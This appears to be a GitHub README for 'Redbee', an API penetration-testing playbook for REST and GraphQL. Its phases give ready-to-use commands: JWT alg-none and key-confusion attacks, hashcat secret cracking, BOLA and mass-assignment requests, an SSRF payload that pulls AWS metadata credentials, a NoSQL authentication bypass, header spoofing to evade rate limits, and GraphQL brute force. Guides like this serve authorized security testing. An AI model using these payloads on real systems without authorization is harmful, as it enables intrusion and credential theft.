
<div align="center">

```
██████╗ ███████╗██████╗ ██████╗ ███████╗███████╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝█████╗  ██║  ██║██████╔╝█████╗  █████╗  
██╔══██╗██╔══╝  ██║  ██║██╔══██╗██╔══╝  ██╔══╝  
██║  ██║███████╗██████╔╝██████╔╝███████╗███████╗
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═════╝ ╚══════╝╚══════╝
```

### 🔐 The API Penetration Testing Playbook

*Because someone has to break it before the bad guys do.*

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![OWASP](https://img.shields.io/badge/OWASP-API%20Top%2010%202023-red.svg)](https://owasp.org/API-Security/)
[![Free Tools](https://img.shields.io/badge/Tools-100%25%20Free-39ff14.svg)](#-tool-stack)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
[![Phases](https://img.shields.io/badge/Phases-8-00d4ff.svg)](#-phases)

</div>

---

> **⚠️ LEGAL DISCLAIMER** — This project is intended **exclusively** for penetration testing activities on systems for which you have **explicit written authorization**. Unauthorized use against third-party systems is illegal and criminally punishable. The authors disclaim all liability for misuse.

---

## 🤔 What is Apinator?

**Redbee** is a complete operational guide for Security Engineers performing penetration tests on REST and GraphQL API applications. No useless theory — just ready-to-use commands, free tools, and techniques that actually work.

It covers the full cycle: from passive reconnaissance to final reporting, following the **OWASP API Security Top 10 2023**.

```bash
# Example: 3 commands to map all API endpoints
subfinder -d target.com -all | dnsx -silent | httpx -silent -o hosts.txt
kr scan -w routes-large.kite --filename hosts.txt
ffuf -u https://target.com/api/FUZZ -w api-wordlist.txt -mc 200,401,403
```

---

## 🗂 Repository Structure

```
redbee/
├── README.md                  ← you are here
├── LICENSE
├── CONTRIBUTING.md
├── guide/
│   └── api-pentest-guide.html ← full interactive guide
├── scripts/
│   ├── bola_tester.py         ← BOLA/IDOR automated tester
│   ├── race_condition.py      ← race condition tester with asyncio
│   └── subdomain_pipeline.sh  ← full recon pipeline
├── wordlists/
│   └── spec_paths.txt         ← common OpenAPI/Swagger paths
└── templates/
    └── finding_template.md    ← pentest report finding template
```

---

## 🚀 Quick Start

### Prerequisites

```bash
# Go tools
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest

# Python tools
pip3 install trufflehog clairvoyance graphql-cop --break-system-packages

# Kiterunner — API-specific endpoint bruteforcer
git clone https://github.com/assetnote/kiterunner
cd kiterunner && make build && sudo mv dist/kr /usr/local/bin/

# jwt_tool
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r jwt_tool/requirements.txt --break-system-packages

# sqlmap
git clone https://github.com/sqlmapproject/sqlmap
```

### Open the interactive guide

```bash
git clone https://github.com/YOUR_USERNAME/redbee
cd redbee
open guide/api-pentest-guide.html        # macOS
xdg-open guide/api-pentest-guide.html   # Linux
```

---

## 📋 Phases

| # | Phase | Goal | Key Tools | OWASP |
|---|-------|------|-----------|-------|
| 01 | [Reconnaissance](#01--reconnaissance) | Map the attack surface without touching the target | Amass, Subfinder, TruffleHog | API9 |
| 02 | [Enumeration](#02--enumeration) | Discover all endpoints and HTTP methods | Kiterunner, ffuf | API9 |
| 03 | [Authentication](#03--authentication) | Attack JWT, OAuth, API Keys | jwt_tool, hashcat | API2 |
| 04 | [Authorization](#04--authorization) | BOLA/IDOR, BFLA, Mass Assignment | Burp Autorize, custom scripts | API1, API3, API5 |
| 05 | [Input Validation](#05--input-validation) | SQLi, NoSQLi, SSRF, XXE | sqlmap, interactsh | API7, API8 |
| 06 | [Rate Limit & Logic](#06--rate-limit--business-logic) | Bypass rate limiting, race conditions, logic flaws | Turbo Intruder, asyncio | API4, API6 |
| 07 | [GraphQL](#07--graphql) | Schema extraction, batching attacks, DoS | clairvoyance, graphql-cop | API8 |
| 08 | [Reporting](#08--reporting) | Documented, actionable findings | Ghostwriter, Pwndoc | — |

---

## 01 · Reconnaissance

**Goal**: collect information without sending direct requests to the target.

```bash
# Google Dorks — find exposed Swagger UI
site:target.com intitle:"swagger ui"
site:target.com inurl:"api-docs"
site:github.com "target.com" "api_key"

# Historical endpoints with Gau
gau target.com | grep -E "api|v[0-9]|rest|graphql" | sort -u

# Secret scanning on public repos
trufflehog github --org=target-org --only-verified
```

---

## 02 · Enumeration

**Goal**: bruteforce API endpoints with dedicated wordlists.

```bash
# Kiterunner — best tool for API discovery
kr scan https://target.com -w routes-large.kite --ignore-length=34

# ffuf — endpoint discovery + verb tampering
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc 200,401,403 -fc 404
```

---

## 03 · Authentication

**Goal**: attack JWT, OAuth flows and API Keys.

```bash
# JWT — algorithm none attack
python3 jwt_tool.py TOKEN -X a

# JWT — RS256 to HS256 confusion
python3 jwt_tool.py TOKEN -X k -pk pub.pem

# JWT — brute force secret
hashcat -a 0 -m 16500 TOKEN rockyou.txt
```

---

## 04 · Authorization

**Goal**: test BOLA, BFLA and Mass Assignment.

```bash
# BOLA — access another user's resources
curl -X GET https://target.com/api/v1/users/1235/docs \
  -H "Authorization: Bearer USER_A_TOKEN"

# Mass Assignment — inject privileged properties
curl -X POST https://target.com/api/v1/register \
  -d '{"username":"x","password":"y","role":"admin","is_admin":true}'
```

> 📄 Full script: [`scripts/bola_tester.py`](scripts/bola_tester.py)

---

## 05 · Input Validation

**Goal**: injection attacks and SSRF.

```bash
# SQLi on API endpoint
sqlmap -u "https://target.com/api/v1/users?id=1" \
  --headers="Authorization: Bearer TOKEN" --level=5 --batch

# SSRF — AWS metadata credentials theft
curl -X POST https://target.com/api/fetch \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# NoSQL injection — MongoDB auth bypass
curl -X POST https://target.com/api/login \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
```

---

## 06 · Rate Limit & Business Logic

**Goal**: bypass rate limiting and exploit logic flaws.

```bash
# IP spoofing via headers
curl -X POST https://target.com/api/login \
  -H "X-Forwarded-For: 1.2.3.4" \
  -d '{"username":"admin","password":"test"}'

# Negative quantity (business logic flaw)
curl -X POST https://target.com/api/cart \
  -d '{"product_id":1,"quantity":-5}'
```

> 📄 Race condition script: [`scripts/race_condition.py`](scripts/race_condition.py)

---

## 07 · GraphQL

**Goal**: extract schema and attack queries/mutations.

```bash
# Schema extraction even with introspection disabled
python3 -m clairvoyance -o schema.json https://target.com/graphql

# Automated security audit
graphql-cop -t https://target.com/graphql

# Batching attack — brute force via mutation (rate limit bypass)
# [{"query":"mutation{login(user:\"admin\",pass:\"0001\"){token}}"},...]
```

---

## 08 · Reporting

Every finding must include:

- **Severity** with CVSS v3.1 score
- **CWE** and **OWASP API Top 10** reference
- **Reproducible PoC** with curl command
- **Business impact** in plain language
- **Specific remediation** with code examples

> 📄 Template: [`templates/finding_template.md`](templates/finding_template.md)

**Recommended tools:**
- [Ghostwriter](https://github.com/GhostManager/Ghostwriter) — full pentest report platform
- [Pwndoc](https://github.com/pwndoc/pwndoc) — lightweight self-hosted report generator

---

## 🛠 Tool Stack

All tools are **100% free and open source**.

| Tool | Category | Link |
|------|----------|------|
| Subfinder | Recon | [projectdiscovery/subfinder](https://github.com/projectdiscovery/subfinder) |
| Amass | Recon | [owasp-amass/amass](https://github.com/owasp-amass/amass) |
| TruffleHog | Secret Scanning | [trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog) |
| Kiterunner | Enumeration | [assetnote/kiterunner](https://github.com/assetnote/kiterunner) |
| ffuf | Fuzzing | [ffuf/ffuf](https://github.com/ffuf/ffuf) |
| jwt_tool | Auth Testing | [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) |
| sqlmap | Injection | [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) |
| interactsh | SSRF/OOB | [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) |
| clairvoyance | GraphQL | [nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance) |
| graphql-cop | GraphQL | [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) |
| Ghostwriter | Reporting | [GhostManager/Ghostwriter](https://github.com/GhostManager/Ghostwriter) |

---

## 🤝 Contributing

Pull requests are welcome! Especially:

- New attack techniques with working commands
- Automation scripts
- Fixes to outdated commands
- Wordlist additions

Read [`CONTRIBUTING.md`](CONTRIBUTING.md) before opening a PR.

---

## 📜 License

MIT © 2025 — see [`LICENSE`](LICENSE) for details.

---

<div align="center">

**If this repo helped you, drop a ⭐ — it costs nothing and means a lot.**

*Hacked with ❤️ and too much caffeine*

</div>
